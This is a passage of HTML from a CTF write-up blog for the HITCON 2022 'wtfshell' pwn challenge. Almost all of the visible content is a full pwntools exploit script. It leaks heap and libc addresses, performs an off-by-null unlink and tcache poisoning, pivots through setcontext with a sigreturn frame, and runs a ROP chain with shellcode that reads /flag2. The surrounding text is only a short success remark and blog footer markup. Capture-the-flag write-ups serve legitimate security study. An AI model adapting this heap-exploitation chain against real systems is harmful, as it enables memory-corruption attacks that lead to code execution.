class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qwq</span>(<span class="params">name</span>):</span></span><br><span class="line">  log.success(<span class="built_in">hex</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="keyword">if</span> point == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r,<span class="string">&quot;b &quot;</span>+point)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/hitcon/heap/share/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;âˆš&quot;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;rip.&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_file</span>(<span class="params">name,flag</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;nsfw,&#x27;</span>+name+<span class="string">b&#x27;,&#x27;</span>+flag</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;omfg,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_data</span>(<span class="params">name,content</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;wtf,&#x27;</span>+content+<span class="string">b&#x27;,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;gtfo,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_user</span>(<span class="params">name</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;stfu,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_pwd</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">    menu(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">    r.send(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_all</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;irl.&#x27;</span></span><br><span class="line">    menu(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        log.success(<span class="string">&quot;addr: &quot;</span>+<span class="built_in">hex</span>(u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xb</span>,<span class="number">0xff</span>):</span><br><span class="line">            payload = <span class="string">b&#x27;asap,&#x27;</span>+name</span><br><span class="line">            menu(payload)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            r.send(pwd)</span><br><span class="line">            r.recvuntil(<span class="string">b&quot;retype password:&quot;</span>)</span><br><span class="line">            r.send(pwd+addr+<span class="built_in">chr</span>(j)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            data=r.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                addr+=<span class="built_in">chr</span>(j)</span><br><span class="line">                r.send(<span class="string">b&#x27;\x00\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> u64(addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">filename,payload,size</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">b&#x27;\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">            recover_data(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">add_user(<span class="string">b&#x27;what&#x27;</span>)</span><br><span class="line">add_user(<span class="string">b&#x27;lotus&#x27;</span>)</span><br><span class="line">heap_base=burp(<span class="string">b&#x27;lotus&#x27;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)-<span class="number">0x880</span></span><br><span class="line">key = heap_base&gt;&gt;<span class="number">12</span></span><br><span class="line"><span class="comment"># for i in range(0x7):</span></span><br><span class="line"><span class="comment"># new_file(b&#x27;chunk1&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"><span class="comment"># add_data(b&#x27;chunk1&#x27;)</span></span><br><span class="line">new_file(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">new_file(<span class="string">b&#x27;chunk21&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;chunk22&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk2&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2</span>):</span><br><span class="line">        add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">    add_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>+<span class="string">b&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">[add_data(<span class="string">b&#x27;big&#x27;</span>,p16(<span class="number">0x1650</span>)+<span class="string">b&#x27;/&#x27;</span>*(<span class="number">0x100</span>-<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;3&#x27;</span>)<span class="comment">#use to get the free 0x110 tcache and add a chunk between the unsortedbin and the top chunk</span></span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;big&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)<span class="comment"># free the unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x408 back</span></span><br><span class="line">[add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add 0x521 chunk to off-by-null</span></span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x5</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line"></span><br><span class="line">add_data(<span class="string">b&#x27;gbuff&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete_all()</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;useless_chunk&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add a 0x321 chunk and edit its fake_next_size</span></span><br><span class="line">new_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">[add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x100</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x3</span>)]</span><br><span class="line">add_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">[recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>)]</span><br><span class="line">recover_data(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>,<span class="string">b&#x27;\x31&#x27;</span>*(<span class="number">0x2ff</span>-<span class="number">6</span>)+<span class="string">b&#x27;\x09&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>))<span class="comment">#make off by null and clear the prev_size</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    new_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x9</span>):</span><br><span class="line">    recover_data(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;i&#x27;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">fake_point = heap_base+<span class="number">0x2af0</span></span><br><span class="line">fake_point_addr = fake_point+<span class="number">0x30</span></span><br><span class="line">fake_unlink_chunk = <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1651</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point_addr-<span class="number">0x10</span>)+p64(fake_point_addr-<span class="number">0x20</span>)+p64(fake_point_addr-<span class="number">0x18</span>)+p64(fake_point)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">write_addr(<span class="string">b&#x27;chunk15&#x27;</span>,fake_unlink_chunk,<span class="built_in">len</span>(fake_unlink_chunk)-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">[delete_file(<span class="string">b&quot;chunk1&quot;</span>+<span class="built_in">str</span>(i).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4</span>)]</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk17&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk18&#x27;</span>)</span><br><span class="line">delete_file(<span class="string">b&#x27;chunk16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#off by null unlink</span></span><br><span class="line"></span><br><span class="line">delete_file(<span class="string">b&#x27;off-by-null-chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear the tcache list 0x20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa</span>):</span><br><span class="line">    new_file(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    recover_data(<span class="string">b&#x27;useless&#x27;</span>+<span class="built_in">str</span>(i).encode(),<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2e0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">new_file(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x2d0</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak_libc_base</span></span><br><span class="line">show_file(<span class="string">b&#x27;chunk14&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x220</span>)</span><br><span class="line">strtok_libc_got = libc_base + <span class="number">0x1f6040</span></span><br><span class="line">write_addr(<span class="string">b&#x27;edit_tcache_next&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">192</span>+p64((strtok_libc_got-<span class="number">0x20</span>)^(key+<span class="number">3</span>)),<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x8c385</span> <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></span><br><span class="line"></span><br><span class="line">new_file(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">recover_data(<span class="string">b&#x27;go_attack&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(magic_gadget)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">address = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = address</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = address</span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) + p64(heap_base + <span class="number">0x3d50</span>)</span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">menu(payload)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x3fa43</span></span><br><span class="line">pop_rbx_ret = libc_base + <span class="number">0x2f1d1</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x99a83</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x23b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x166262</span></span><br><span class="line">pop_r8_ret = libc_base + <span class="number">0x8c3de</span> <span class="comment"># pop r8; mov qword ptr fs:[0x300], rdi; ret;</span></span><br><span class="line">syscall = libc_base + <span class="number">0x8cc36</span></span><br><span class="line">int_80 = libc_base + <span class="number">0xce0cb</span></span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">6</span>)</span><br><span class="line">rop += p64(pop_rcx_ret) + p64(<span class="number">0x22</span>)</span><br><span class="line">rop += p64(pop_r8_ret) + p64(<span class="number">0xffffffff</span>)</span><br><span class="line">rop += p64(libc_base + libc.sym[<span class="string">&#x27;mmap&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">rop += p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(<span class="number">0x100008</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(rop)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">	xor rdi, rdi;</span></span><br><span class="line"><span class="string">	push 3;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	push 3;</span></span><br><span class="line"><span class="string">	pop rbx;</span></span><br><span class="line"><span class="string">    push 0x100000;</span></span><br><span class="line"><span class="string">    pop rcx;</span></span><br><span class="line"><span class="string">    xor rdx, rdx;</span></span><br><span class="line"><span class="string">    push 0x127;</span></span><br><span class="line"><span class="string">    pop rax;</span></span><br><span class="line"><span class="string">	int 0x80;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	xor rdi, rdi;</span></span><br><span class="line"><span class="string">	push rsp;</span></span><br><span class="line"><span class="string">	pop rsi;</span></span><br><span class="line"><span class="string">	add rsi, 0x200;</span></span><br><span class="line"><span class="string">	push rsi;</span></span><br><span class="line"><span class="string">	pop rbx;</span></span><br><span class="line"><span class="string">	push 0x100;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	xor rax, rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	push 1;</span></span><br><span class="line"><span class="string">	pop rdi;</span></span><br><span class="line"><span class="string">	push 0x100;</span></span><br><span class="line"><span class="string">	push rbx;</span></span><br><span class="line"><span class="string">	push rsp;</span></span><br><span class="line"><span class="string">	pop rsi;</span></span><br><span class="line"><span class="string">	push 1;</span></span><br><span class="line"><span class="string">	pop rdx;</span></span><br><span class="line"><span class="string">	push 20;</span></span><br><span class="line"><span class="string">	pop rax;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;/flag2\x00\x00&#x27;</span> + shellcode)</span><br><span class="line"></span><br><span class="line">qwq(heap_base)</span><br><span class="line">qwq(libc_base)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è‡³æ­¤ï¼Œ <code>wtfshell2</code>  get</p>
<p><img data-src="https://tva3.sinaimg.cn/large/008qDYGVgy1h8ob1fnj1ij30ai031gn4.jpg" alt="3"></p>
<p>LoÏ„Ï…s å¤ªğŸŒ¿äº†ğŸ¥ºã€‚</p>

      <div class="tags">
          <a href="/tags/wp/" rel="tag"><i class="ic i-tag"></i> wp</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">æ›´æ–°äº</span>
    <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-01-14 15:06:00" itemprop="dateModified" datetime="2023-01-14T15:06:00+08:00">2023-01-14</time>
  </span>
  <span id="2022/12/01/hitcon-wtfshell/" class="item leancloud_visitors" data-flag-title="hitcon2022-wtfshell" title="é˜…è¯»æ¬¡æ•°">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">é˜…è¯»æ¬¡æ•°</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">æ¬¡</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> èµèµ</button>
  <p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="LoÏ„Ï…s å¾®ä¿¡æ”¯ä»˜">
        <p>å¾®ä¿¡æ”¯ä»˜</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="LoÏ„Ï…s æ”¯ä»˜å®">
        <p>æ”¯ä»˜å®</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>æœ¬æ–‡ä½œè€…ï¼š </strong>LoÏ„Ï…s <i class="ic i-at"><em>@</em></i>æ¸…é¢¨å¾®é†º
  </li>
  <li class="link">
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong>
    <a href="https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/" title="hitcon2022-wtfshell">https://www.wdqjxtmph.top/2022/12/01/hitcon-wtfshell/</a>
  </li>
  <li class="license">
    <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63c2582bbe43e0d30e039bc4.webp" title="ç¾ŠåŸæ¯pwn wp">
  <span class="type">ä¸Šä¸€ç¯‡</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>ç¾ŠåŸæ¯pwn wp</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;63dd13114757feff3385303d.png" title="2022è¥¿æ¹–è®ºå‰‘pwnéƒ¨åˆ†wp">
  <span class="type">ä¸‹ä¸€ç¯‡</span>
  <span class="category"><i class="ic i-flag"></i> CTF</span>
  <h3>2022è¥¿æ¹–è®ºå‰‘pwnéƒ¨åˆ†wp</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
